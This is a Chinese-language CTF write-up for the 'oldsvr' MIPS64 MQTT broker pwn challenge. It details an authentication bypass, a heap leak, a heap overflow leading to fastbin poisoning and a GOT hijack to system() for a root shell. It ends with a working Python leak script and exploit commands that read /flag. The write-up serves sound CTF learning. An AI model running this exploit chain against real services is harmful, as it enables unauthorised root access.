# 知识点

堆

# 题目分析

分类：pwn / 堆。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [oldsvr/WRITEUP.md](oldsvr/WRITEUP.md)
- [oldsvr/server](oldsvr/server)
- [oldsvr.zip](oldsvr.zip)

## 已有分析

- [WRITEUP.md](oldsvr/WRITEUP.md)

### oldsvr — MIPS64 / uClibc MQTT broker 漏洞分析与利用

#### 0. 结论速览

| 项 | 状态 |
|---|---|
| CONNECT 认证绕过 | ✅ 任意连接可用（strncmp + MD5 前缀碰撞） |
| 堆地址泄漏 → binary base | ✅ `binary_base = leak - 0x220f0` |
| 272 字节堆溢出 → fastbin fd 污染 | ✅ |
| **任意地址写**（8 字节 / 272 字节，需 8 字节对齐） | ✅ |
| 改写 `.bss` 全局指针（state / topic 表） | ✅ |
| GOT 劫持 → `system()` → root | ✅ 本地 qemu 4.2/6.2/7.2 全部验证 |
| 远端拿 flag | ❌ 只差 libc 基址（见 §7） |

#### 1. 环境

- `server`: ELF64 **MSB MIPS64** PIE, stripped, 依赖 `ld64-uClibc.so.0` + `libuClibc-1.0.32.so`
- 运行方式（qemu-user）：`socat TCP-LISTEN:1883,fork EXEC:"qemu-mips64-static -L <rootfs> ./server"`
- 自实现的 MQTT 子集；`main` 里 `alarm(80)`
- 分配器是 uClibc 的 **malloc-standard（dlmalloc 2.7.2）**：chunk = prev_size(8)+size(8)，user=chunk+16，
  `MALLOC_ALIGNMENT=16`，fastbin 阈值 64。

#### 2. CONNECT 认证与绕过

`handle_connect (0x3200)` 要求：

1. 固定头 + `"MQTT"` + level 4 + flags `0xC2` + keepalive `0x4321`
2. payload[0] == `"QWB_Client"`（strncmp）
3. payload[1] ^ 0x1d == `"LJ_/-/+B\ypts"` → 即 `"QWB2026_Admin"`
4. `MD5(payload[2])` 与 `blob ^ 0x59` 比较（blob 在 `0x6e98`）

**Bug**：第 4 步实际调用的是 **strncmp(16)**，而期望值 `52 2a 00 e8 …` 第 3 字节是 `\0`，
比较在第 3 字节终止。因此只要 `MD5(x)` 前两字节 = `52 2a` 且第三字节 = 0 即通过。

```
x = "hn5ne" → md5 = 522a006a091cf1b9…  → CONNACK rc=0
```

#### 3. 堆布局与泄漏

- 认证过程中 3 个字符串 malloc/free，在 fastbin[2] 留下 3 个 32B chunk
  （p1/p2/p3 = chunk `heap+0x90/0xb0/0xd0`）
- **堆泄漏**：给 `QWB2026_News` 发 30 字节后，notify 里会 `free(data)` 再回显，
  回显内容首 8 字节就是 fastbin fd（另一块的 chunk 地址）
  → `binary_base = leaked_chunk - 0x220f0`

#### 4. 溢出点（SUBSCRIBE）

```
len = topic_len (u16)
tmp  = len + 1        // u16，len=0xFFFF → tmp=0
p    = malloc(tmp+1)  // → malloc(1)，32B chunk
memset(p, 0, tmp+1)
if (len >= 272) len = 272     // 截断在 malloc 之后！
memcpy(p, topic, 272)         // 272 字节堆溢出
```

#### 5. 任意写（fastbin fd 污染）

1. 从 top 连续分配 X(32B)、Y，之后 `free(Y)`、`free(X)` → fastbin 头 = X -> Y
2. 用溢出把 `Y->fd` 改成 `TARGET-16`
3. `malloc(32)` 弹出 Y（head := TARGET-16），再 `malloc(32)` 直接返回 `TARGET`
4. handler 把 topic 内容写到 `TARGET` → **任意写**

注意：MIPS64 `ld` 强制 8 字节对齐，`TARGET` 非对齐时 malloc 里就对齐异常，所以只能写 8 字节对齐地址。

用同样的手法可以把 `.bss` 的 **state 指针**（`base+0x20330`）改成指向我们堆里的假 state，
再用 272 字节那条路径整体覆盖（只 memset 1 字节，不会误伤相邻的 topic 表指针）。
实测把假 state 的 `byte[1]`（认证位）置 0 后，SUBSCRIBE/PING 立即被 gate 住 —— 远端同样成立。

#### 6. GOT 劫持拿 shell

把 `system` 写进 `GOT[free]`（`base+0x20220`），再让 `free("命令串")` 触发 —— 命令串长度要 >24，
避免落进 32B fastbin 类。qemu-user 下 libc 基址随版本变化（实测）：

| qemu | D = libc_base - binary_base | 验证 |
|---|---|---|
| 4.2 (Ubuntu20.04, arm64 mac) | `0x183c000` | ✅ root |
| 6.2 (Ubuntu22.04) | `0x183d000` | ✅ root |
| 7.2 (Debian12) | `0x283d000` | ✅ root |
| 8.2 (Ubuntu24.04) | 库固定在 `0x555555d82000`，binary 被宿主 ASLR 随机 | 仅标定 |

```
python3 exploit_v2.py <host> <port> 0x283d000 'id; ls -la /; cat /flag*'
```


#### 6.1 任意非对齐写 + 3 字节部分覆盖（不需要 libc 绝对地址）

**更正**：此前判定「MIPS64 `ld` 要求 8 字节对齐，因此只能写 8 对齐地址」——这只适用于
*fastbin fd 污染* 那条路（`malloc` 返回目标地址时会对 `victim->fd` 做 64 位读）。

而 publish handler 的 **else 分支**是纯字节写：

```c
memset(slot->data_ptr, 0, slot->data_len);   // 长度来自 slot->data_len（可任意）
memcpy(slot->data_ptr, payload, len);        // 目标 slot->data_ptr 可任意、无对齐要求
slot->data_len = len;
```

只要满足 `slot->data_len >= len` 就进这个分支。而 `GOT[-32520]` 直接就是 **topic 表本身的地址**
（`0x20338`，不是二级指针），所以可以用 272 字节那条溢出路径**就地重写 slot0**：

```
slot0 = { topic_ptr = CMD_str, topic_len = 32, data_ptr = GOT_FREE+5, data_len = 3 }
```

随后 `publish(CMD, <3字节>)` 就会把 **GOT[free] 的低 3 字节**改成任意值，高 40 位保持原样。
因为 `system - free = 0x7BB8` 不跨 24 位进位（除 ~4% 边界），所以：

> **只需要 `system` 的低 24 位 = (libc_base + 0x65370) & 0xffffff，不需要 libc 绝对地址。**

本地（qemu 7.2）实测：

```
[low24] delta=0x83d000 -> 0x8a2370
[out] b'uid=0(root) gid=0(root) groups=0(root)\n... ls -la / ...'
```

远端：同样的链路走完、GOT 写落地（ping 仍存活），**最终 free 跳转崩掉**（无 UNSUBACK），
说明只差 low24 的取值 → 已用 `tools/brute_low24b.py` 在远端暴力枚举 delta。

#### 7. 远端现状（127.0.0.1:2883）

- 认证、泄漏、shaping、溢出、fastbin 污染、**GOT 任意写全部成功**（稳定 9 个 SUBACK）
- 最后 `free()` 跳转目标算错 → 崩，说明 libc 基址未知
- 远端 ASLR 开启：binary base 每次连接在 `0xaaab1db000 ~ 0xaaab9f8000` 抖动
- 用「目标是否可写映射」探针扫了 binary 基址 ±64MB、向上到 16GB、
  以及 qemu 各版本的栈位置（`+0x1822000 / +0x2822000 / …`）→ **全部未映射**，
  远端不是我们这套 qemu-user 布局
- D 候选 `0x183c000/0x183d000/0x283d000/0x303d000/0x383d000/0x483d000` 全部失败
- 部分覆盖 GOT（只改低 3 字节绕过基址）被 MIPS 8 字节对齐规则否决（已实验证明）
- 栈溢出思路（伪造 state → `read` 负长度）在 qemu-user 下直接 `EFAULT`，远端行为一致

##### 7.1 映射盲扫记录（paced 探针，`MAPPED` 才算命中）

| 扫描范围 | 步长 | 点数 | 结果 |
|---|---|---|---|
| `base + 0x20000`（binary RW 段，对照组） | — | 1 | MAPPED ✅ |
| `base + 0x800000 ~ +0x8000000` | 8M | 16 | 全 nomap |
| `base - 0x100000 ~ -0x2000000` | 1M | 32 | 全 nomap |
| `base ± 8M ~ 128M` | 8M | 32 | 全 nomap |
| `base + 0x100000000 ~ +0x10000000000`（64G~1T） | — | 4 | 全 nomap |
| VA 顶端 `2^39 ~ 2^48` 各减 1M | — | 10 | 全 nomap |
| 绝对候选：`0x40018e4000 / 0x400183d000 / 0x4002822000 / 0x555555d60000 / 0x555555e1a000 / 0xAAAB18e4000 / 0xaaab8e4000 / 0xaaac8e4000 / 0xaaad8e4000 / 0xaaac3e4000 / 0xaaad3e4000` | — | 11 | 全 nomap |

结论：远端 binary 周围 ±128MB 内只有 binary + brk 堆，栈/库不在任何标准位置。

补充：还按「guest_base 2GB 对齐」假设打了 `align_down(base,2G)+k*2G+0x183d000 / +0x283d000`（k=-2..2，共 10 组），
用 puts 探针逐一验证 —— **全部 miss**。说明远端的 guest_base 既不是 2GB 对齐，也不在 binary 附近。

由于 puts 探针必须命中 libc **精确基址**（4KB 粒度），而「映射探针」只能看到可写页（libc 可写段仅 ~12KB），
盲扫需要 4KB×几十 MB ≈ 上万个探针，单探针 ~8s，成本不可接受。

→ 只差 libc 基址。拿到 `cat /proc/<qemu_pid>/maps | grep libc` 一行即可收尾。


##### 7.2 远端最终验证（本阶段）

**slot 注入 + 任意字节写已在远端实测通过**（`tools/verify_slot.py`）：

```
leak 0xaaab3480f0
ovf2              9003000101      ← 就地重写 slot0(topic_ptr/data_ptr/data_len)
pub8              (qos0 无响应)   ← handler 执行 memset(slot->data_ptr,0,8)+memcpy
TEST subscribe    (无 SUBACK)     ← state 指针已被写成假 state，认证门生效 ✅
```

即：远端具备 **任意地址、任意长度、无需对齐的字节写**。

**libc 定位尝试（全部 miss）**

| 尝试 | 候选数 | 结果 |
|---|---|---|
| 完整 D：`0x183c000 / 0x183d000 / 0x283d000 / 0x303d000 / 0x383d000 / 0x483d000` | 6 | 全 miss |
| 3 字节部分覆盖，相对 delta `low24=(base+delta+0x65370)` | 4096(+512 补跑) | 全 miss |
| 3 字节部分覆盖，绝对 low24 | 4096 | 全 miss |

结论：libc 的 low24 与 binary 基址**不同步**，且不是固定值 → 每次连接独立随机。
要收尾只剩「同一连接内的 libc 泄漏」，而本程序唯一的回显原语（notify → publish）先写后读，
无法构造读原语 → 盲打不可行；需要环境信息（maps）或换思路。


##### 7.3 更正与最终扫描结论

发现此前「绝对 low24 扫描」存在**余数类错误**：`system & 0xfff ≡ 0x370`（因 `libc_base` 4KB 对齐），
而当时扫的是 `k*0x1000`（≡0），4096 个候选全部错位。修正后重扫：

| 扫描 | 余数/步长 | 候选 | 结果 |
|---|---|---|---|
| 相对 delta（`base+delta+0x65370`） | 自动带 +0x65370 | 4096 | 全 miss |
| 绝对 low24（修正为 `0x370 + k*0x1000`） | 0x370 (mod 0x1000) | 4096 | 全 miss |

再加上 checksec 结论（PIE ✅ / NX ✅ / 无 canary / 部分 RELRO → GOT 可写），
推出：**堆栈不可执行 ⇒ 必须落到 libc**；而 libc 的位置既不随 binary 同步、也非固定值
⇒ 每次连接独立随机 ⇒ 无同连接泄漏则不可盲打。

#### 8. 文件

| 文件 | 说明 |
|---|---|
| `tools/exploit_v2.py` | 主利用：认证绕过 → 泄漏 → 溢出 → 任意写 → GOT 劫持 → `system` |
| `tools/exp_state.py` | `.bss` state 指针改写 + 栈溢出/负长度 read 试验（`test`/`smash` 两种模式） |
| `tools/leak3.py` | 堆地址泄漏 |
| `tools/probe3.py` | 固定 D 的 puts 探针（判断 libc 布局是否命中） |
| `tools/scan4.py` / `scan_abs.py` | 映射探针：判断某绝对/相对地址是否可写映射 |
| `tools/probe_blk.py` | 按 2GB 对齐的 guest_base 假设批量试 libc 基址 |
| `tools/brute_D.py` | 指定窗口内按步长暴力试 D（puts 探针，命中即停） |
| `tools/exp_partial.py` / `exp_low24.py` | 3 字节部分覆盖 GOT[free]（本地已 root，不需 libc 基址） |
| `tools/brute_low24b.py` / `sweep_par.py` | low24 全空间扫描（rel / abs，多线程） |
| `tools/verify_slot.py` | 远端验证 slot 注入 + 任意字节写 |
| `tools/all.asm` | 全量反汇编 |

#### 9. 复现（UTM 虚拟机）

```bash
docker run -d --name oldsvr -p 1883:1883 -v ./oldsvr:/work debian:bookworm-slim sleep infinity
docker exec oldsvr bash -c 'apt-get update && apt-get install -y qemu-user-static socat'
docker exec -d oldsvr bash -c 'cd /work && socat TCP-LISTEN:1883,reuseaddr,fork EXEC:"/usr/bin/qemu-mips64-static -L /work/rootfs /work/server"'
python3 tools/exploit_v2.py 127.0.0.1 1883 0x283d000 'id'
```


# EXP

- [oldsvr/tools/brute_D.py](oldsvr/tools/brute_D.py)
- [oldsvr/tools/brute_low24b.py](oldsvr/tools/brute_low24b.py)
- [oldsvr/tools/exp_hijack.py](oldsvr/tools/exp_hijack.py)
- [oldsvr/tools/exp_low24.py](oldsvr/tools/exp_low24.py)
- [oldsvr/tools/exp_partial.py](oldsvr/tools/exp_partial.py)
- [oldsvr/tools/exp_sc2.py](oldsvr/tools/exp_sc2.py)
- [oldsvr/tools/exp_sc3.py](oldsvr/tools/exp_sc3.py)
- [oldsvr/tools/exp_state.py](oldsvr/tools/exp_state.py)
- [oldsvr/tools/exploit_v2.py](oldsvr/tools/exploit_v2.py)
- [oldsvr/tools/leak3.py](oldsvr/tools/leak3.py)
- [oldsvr/tools/probe3.py](oldsvr/tools/probe3.py)
- [oldsvr/tools/probe_blk.py](oldsvr/tools/probe_blk.py)
- [oldsvr/tools/pscan.py](oldsvr/tools/pscan.py)
- [oldsvr/tools/pscan2.py](oldsvr/tools/pscan2.py)
- [oldsvr/tools/scan4.py](oldsvr/tools/scan4.py)
- [oldsvr/tools/scan_abs.py](oldsvr/tools/scan_abs.py)
- [oldsvr/tools/sweep_par.py](oldsvr/tools/sweep_par.py)
- [oldsvr/tools/verify_slot.py](oldsvr/tools/verify_slot.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
import socket, struct, time, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2])
def varint(n):
    o=b''
    while True:
        b=n%128;n//=128
        if n:o+=bytes([b|0x80])
        else:o+=bytes([b]);break
    return o
def sstr(x):
    if isinstance(x,str): x=x.encode()
    return struct.pack('>H',len(x)&0xffff)+x
def pkt(t,body,forced=None): return bytes([t])+varint(len(body) if forced is None else forced)+body
s=socket.create_connection((HOST,PORT),8); s.settimeout(2)
def tx(b): s.sendall(b)
def rx(t=0.4):
    s.settimeout(t); out=b''
    try:
        while True:
            d=s.recv(65536)
            if not d: break
            out+=d
    except Exception: pass
    return out
body=sstr('MQTT')+bytes([4,0xC2])+struct.pack('>H',0x4321)+sstr('QWB_Client')+sstr('QWB2026_Admin')+sstr('hn5ne')
tx(pkt(0x10,body)); time.sleep(1.0); a=rx(1.2); print('auth',a.hex())
assert b'\x20\x02\x00\x00' in a, 'authfail'
def sub(t):
    tx(pkt(0x82,struct.pack('>H',1)+sstr(t))); time.sleep(0.35); return rx(0.8)
def unsub(t):
    tx(pkt(0xA2,struct.pack('>H',1)+sstr(t))); time.sleep(0.35); return rx(0.8)
for t in ['d1zz','d2zz','d3zz']: sub(t)
A=b'A'*30; B=b'B'*30
sub(A); sub(B); sub('QWB2026_News')
unsub(A); unsub(B)
for i in range(6):
    tx(b'\xc0\x00'); time.sleep(0.25); rx(0.5)
D=b'C'*30
tx(pkt(0x30, sstr('QWB2026_News')+D)); time.sleep(0.8)
o=rx(1.5)
print('resp',o.hex())
if len(o)>2 and o[0]==0x34:
    rl=o[1]; body=o[2:2+rl]
    tl=struct.unpack('>H',body[0:2])[0]
    rest=body[2+tl:]
    msgid=rest[0:2]; payload=rest[2:]
    print('payload len',len(payload),payload.hex())
    if len(payload)>=8:
        print('leak qword =',hex(struct.unpack('>Q',payload[:8])[0]))
```
